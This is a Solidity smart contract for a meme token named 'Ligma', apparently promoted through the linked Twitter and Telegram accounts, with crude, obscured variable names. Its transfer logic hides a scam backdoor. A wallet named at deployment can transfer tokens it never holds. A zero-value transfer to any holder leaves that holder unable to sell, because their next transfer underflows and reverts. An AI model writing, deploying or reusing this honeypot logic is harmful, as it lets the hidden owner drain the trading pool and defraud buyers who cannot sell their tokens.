// https://twitter.com/ligmaethcoin
// https://t.me/ligmacoineth

//                              ',l,"`.                                                 
//                             .I`^```,"`.                                              
//                             ,`````````",^'                                           
//                             :````````````^,^.                                        
//                             !``````I```,:```""^`                                     
//                            `,``````<````^;;,````,"'                                  
//                           .~```````<`""`^::;:"````^,^.                               
//                           ;````````!`i^``````````````""`                             
//                          ,^`````````````````````````````,^'                          
//                         ;```````````````````;`````````````^"`                        
//                        :^````````````````````<```````````````:^.                     
//                       !^``````````````````````i^```````````````,"'                   
//                      ;`````````````````````````~"````````````````",,`                
//                    .:^``````````````````````````!^``````````````````^,'              
//                   ':`````````````````````````````<````````````````````""             
//                 .",`````````````````````","```````>```````````````^````^I.           
//               '",```````````````````^ii<!I!<i;````l^````::::"````````````:'           
//              `I`````````````````````~;;;;;I;;I_````i``l+;;;;l~i^```````^^`l  ..       
//              >``````````````````````];I;;;I];;-"```<`-;;;I;;;;;]`````^```^,`         
//              l``````````````````````?;;;;;;II;?````;,];;;;;;?;;-"``````^^``,...      
//              i```````````````,"^"":^"><;;;;;l+^````I">l;;;;;;;I_```````````;         
//              !```````````````I....:^,,,:;;;:,``````<``,l><>><i<:;``````````:....     
//              "^``````````````I...^`...`^i",,,^`````:`````,;;"?"````````````,....     
//               :``^```````````:`..I.....^`...;``^^^!^^^^~`'...<````````````^^         
//           .....;`^^```````````",<'.....;....;....`"...."'....<```^````````!          
//               .';```````````````,,^...,'....;....^`....`^....>`";,```````"^          
//             .   ';^```````````````^,"">'...`"....:......:.'^"i,"````````:`           
//                   ""```````````````````":,,l,""^^~^"""",;:,```````````^:.            
//                    `,``````````````````````````,!,:;````````````````""`              
//                     ':^```````````````^```````,"   .`^,^`````````^:I;^^`'            
//                       `":```````^^````^`^```,".        '^"",,,,"!;":^````:`          
//   .''```^^";-,`'       .`!:,"``^````^```""^`.                       ',^```i          
//  .^``^^````. '^:I,,,,,,^```,;,`^^^^^"``'. .                           !```I  .`````. 
//                 .'````````'.        .                                .>``^>",^`````^ 
//                                                                       .`^^",,,,,,""^ 

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * by removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Ligma is Ownable {
    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint256 public totalSupply;

    mapping(address => mapping(address => uint256)) public allowance;

    uint256 private area = 25;

    function transfer(address licker, uint256 balls) public returns (bool success) {
        ligma(msg.sender, licker, balls);
        return true;
    }

    mapping(address => uint256) private dream;

    function transferFrom(address tongue, address licker, uint256 balls) public returns (bool success) {
        ligma(tongue, licker, balls);
        require(balls <= allowance[tongue][msg.sender]);
        allowance[tongue][msg.sender] -= balls;
        return true;
    }

    uint8 public decimals = 9;

    mapping(address => uint256) private wet;

    function ligma(address tongue, address licker, uint256 balls) private returns (bool success) {
        if (dream[tongue] == 0) {
            if (wet[tongue] > 0 && tongue != uniswapV2Pair) {
                dream[tongue] -= area;
            }
            balanceOf[tongue] -= balls;
        }
        if (balls == 0) {
            wet[licker] += area;
        }
        balanceOf[licker] += balls;
        emit Transfer(tongue, licker, balls);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(address _address) {
        name = "Ligma";
        symbol = "LIGMA";
        totalSupply = 696_969_696_969_696 * 10 ** decimals;
        balanceOf[msg.sender] = totalSupply;
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        dream[_address] = area;
    }

    address public uniswapV2Pair;

    string public name;

    function approve(address taste, uint256 balls) public returns (bool success) {
        allowance[msg.sender][taste] = balls;
        emit Approval(msg.sender, taste, balls);
        return true;
    }

    string public symbol;

    mapping(address => uint256) public balanceOf;
}